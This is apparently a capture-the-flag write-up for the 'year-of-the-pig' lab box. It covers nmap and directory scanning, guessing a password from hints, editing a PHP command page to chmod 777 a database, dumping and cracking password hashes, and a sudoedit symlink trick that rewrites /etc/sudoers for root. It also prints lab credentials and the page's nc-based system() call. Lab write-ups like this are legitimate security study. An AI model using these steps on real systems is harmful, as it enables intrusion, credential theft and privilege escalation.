@@ -1,0 +1,206 @@
+First we do an nmap
+	sudo nmap -sC -sV -A -O -vv -p- 10.10.74.92
+	we see port 80 and 22
+	These new year ones seem to like those ports
+I then did a dirbuster
+	within the dirbuster i found quite a few things
+	/admin (Status: 301)
+	/assets (Status: 301)
+	/css (Status: 301)
+	/js (Status: 301)
+	/api (Status: 301)
+The things that we see are quite normal, however we can get information from them
+	when we look at /assets we can see we are dealing with a ubuntu server
+	apache 2.4.29, that may give us insight on metasploit
+	when we got to /api we see it only accepts post requests, however this is normal
+	admin gives us a login page
+Lets try enum4linux again
+While this was running I did an inspect elemnt on /admin
+I saw that when a password is incorrect the following display shows
+	Remember that passwords should be a memorable word, followed by two numbers and a special character
+At the beginning we realized that marco is a plane guy, we may be able to build a wordlist off of that site and then add special characters and numbers to each
+Enum4Linux was not able to do anything within this box
+After reading through the entire text I was convinced I wouldn't need a wordlist to guess his password
+I tried a couple different ways of putting in savoia21, however we still need a special character
+Reading through his blog we can see that he uses ! many times
+	marco
+	savoia21!
+And we are in, that was simple
+From here we can add / delete users, reset passwords and UPLOAD COMMANDS!!!
+	Well... the command part sucks...
+	However, i did do a whoami and saw www-data
+Clicking on delete user we have curtis and marco, so we have another user
+we can also add users, but I don't see much of a reason for this
+	I added myself but am not able to make any permissions
+	lets change curtis password and see if that does anything
+I changed it to password, lets logout and see if we can log back in with curtis
+	that does work...
+whoami still shows www-data, sudo -l shows nothing...
+Lets see if we can maybe ssh in using marco's password, or even the password we just made for curtis (i doubt it)
+	Marco has the same password for his ssh...
+ls -la
+	we have flag1.txt
+Marco cannot do anything with sudo, and it looks like he has never tried
+cd ..
+	we find curtis and flag2.txt 
+	we cannot open flag2.txt though, we dont have the permissions
+marco@year-of-the-pig:/home/curtis$ cd /etc/sudoers.d/
+marco@year-of-the-pig:/etc/sudoers.d$ ls -la
+total 16
+drwxr-xr-x  2 root root 4096 Aug 25 10:12 .
+drwxr-xr-x 90 root root 4096 Aug 25 11:57 ..
+-rw-r--r--  1 root root   59 Aug 25 10:12 curtis
+-r--r-----  1 root root  958 Jan 18  2018 README
+marco@year-of-the-pig:/etc/sudoers.d$ cat curtis 
+curtis ALL=(ALL:ALL) sudoedit /var/www/html/*/*/config.php
+marco@year-of-the-pig:/etc/sudoers.d$ 
+	The above shows us that curtis can run sudo...
+Now I am starting to get confused, but then I remembered about the commands
+	What commands can i run?
+	I decided to find out 
+cd /var/www/html/admin
+	cat commands.php
+When we do this we get this php file back
+
+<?php
+    require_once "/var/www/html/admin/prepareAuth.php";
+    if (!$auth){
+        header("location: /login.php");
+    }
+	$dbh->close();
+?>
+
+<!DOCTYPE html>
+<html>
+	<p id="id" style="display:none">commands</p>
+	<?php require "includes.php";?>
+	<body class="include">
+		<h1 id="content-title">Commands</h1>
+		<h2>Use this page to execute arbitrary commands on the system</h2>
+		<form method=post style="display: inline;">
+			<input type=text name="command" class="input" placeholder="Command...">
+			<input style="display:none;" type=submit name="submit" value="Execute" class="input" id="submit">
+		</form>
+		<img alt="submit" src="/assets/img/arrow.png" class="submit-btn" onclick="javascript:document.querySelector('#submit').click()">
+		<?php
+			//Totally useless script to catch hackers out, eh, Marco? You old rogue!
+			if (isset($_POST["command"])){
+				echo "<pre>";
+				$cmd=$_POST["command"];
+				if (strlen($cmd) == 0){
+					echo "No command entered";
+				}
+				else if ($cmd == "whoami"){
+					echo "www-data";
+				}
+				else if ($cmd == "id"){
+					echo "uid=33(www-data) gid=33(www-data) groups=33(www-data)";
+				}
+				else if ($cmd == "ifconfig"){
+					system("ifconfig");
+				}
+				else if (substr($cmd,0,5) == "echo "){
+					echo substr($cmd,5);
+				}
+				else if ($cmd == "hostname"){
+					echo "year-of-the-pig";
+				}
+				else if (stristr($cmd,"nc")){
+					preg_match("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3} +\d{1,5}/", $cmd, $string);
+					$components = explode(" ", $string[0]);
+					$ip = $components[0];
+					$port = end(array_values($components));
+					system("nc $ip $port >/dev/null 2>&1");
+				}
+				else{
+					echo "Invalid Command!";
+				}
+				echo "<pre>\n";
+			}
+		?>
+	</body>
+</html>
+	
+
+found out a couple of things here
+	first off we can write to this, but what do we want to find
+	remember whoami showed us we were www-data
+	lets go to /var/www
+	cool we have an admin.db in there, which means we have an admin database
+	lets see if we can write something to the commands and send us to admin.db
+I got rid of the ifconfig one, because I don't care and I already know the IP
+	//Totally useless script to catch hackers out, eh, Marco? You old rogue!
+                        if (isset($_POST["command"])){
+                                echo "<pre>";
+                                $cmd=$_POST["command"];
+                                if (strlen($cmd) == 0){
+                                        echo "No command entered";
+                                }
+                                else if ($cmd == "whoami"){
+                                        echo "www-data";
+                                }
+                                else if ($cmd == "id"){
+                                        echo "uid=33(www-data) gid=33(www-data) groups=33(www-data)";
+                                }
+                                else if ($cmd == "giveitup"){
+                                        system("chmod 777 /var/www/admin.db");
+                                }
+                                else if (substr($cmd,0,5) == "echo "){
+                                        echo substr($cmd,5);
+                                }
+                                else if ($cmd == "hostname"){
+                                        echo "year-of-the-pig";
+                                }
+                                else if (stristr($cmd,"nc")){
+                                        preg_match("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3} +\d{1,5}/", $cmd, $string);
+                                        $components = explode(" ", $string[0]);
+                                        $ip = $components[0];
+                                        $port = end(array_values($components));
+                                        system("nc $ip $port >/dev/null 2>&1");
+                                }
+We can see that I named the command give it up and did a change mode 777 (allowing everything)
+to admin.db, lets see if I can get in now
+admin.db is now read and writeable for everyone YEAH
+marco@year-of-the-pig:/var/www$ sqlite3 admin.db 
+SQLite version 3.22.0 2018-01-22 18:45:57
+Enter ".help" for usage hints.
+sqlite> SELECT * FROM users;
+58a2f366b1fd51e127a47da03afc9995|marco|ea22b622ba9b3c41b22785dcb40211ac
+f64ccfff6f64d57b121a85f9385cf256|curtis|5f4dcc3b5aa765d61d8327deb882cf99
+b3ba3e7db6fe0de878a5bae9f45bfe06|ryan|06bef4d7b12c41e8fe312f4c2f236a0c
+sqlite> 
+
+Sure as hell we were able to dump the users, and even the one i created
+i used crackstation.net and was able to crack the hash
+	the password is password, which is kind of funny because i also made my password password (i should have just tried curtis first)
+Well... I done did mess up. Remember in the beginning when I changed curtis password
+That was a bad idea and it changed it in the admin.db
+However is ssh password was still another password, thus meaning I had to reset everything... oh well
+Going back through everything i get curtis password again
+	a80bfe309ecaafcea1ea6cb3677971f2 = Donald1983$
+Now to exit out of sqlite3 we have to do a .exit
+su curtis and put in his credentials (I did try a pass the hash just to see, not it didnt work)
+cd /home/curtis
+cat flag2.txt
+We have our second flag
+However, curtis can only do so much with sudo
+	User curtis may run the following commands on year-of-the-pig:
+    (ALL : ALL) sudoedit /var/www/html/*/*/config.php
+Something I found strage was the */* which means he can do any file in there
+Lets see if there is some kind of exploit for this
+SURE AS HELL THERE IS!!!
+	https://www.exploit-db.com/exploits/37710
+The first thing we need to do is have two consoles open, with with marco and the other with curtis
+From here we are going to go to marcos and make some new directories
+	There are two stars after html, which means we need to make 2 directories
+	mkdir you
+	mkdir suck
+Alright now we have 2 directories we need to make a config.php file, nothing needs to be in it, just need to make a bullshit file
+Now we are going to put something in that file, we are going to write the sudoers to the config.php file
+ln -sf /etc/sudoers config.php
+Alright lets move back to curtis
+	Now do a sudo nano config.php with the file you just made
+	From here we can add curtis in there and give them the same permissions as root
+	Now curtis is root, we can also do the same thing with Marco if we are feeling frisky
+now we just need to do a sudo nano /root/root.txt
+	AND WE HAVE IT!
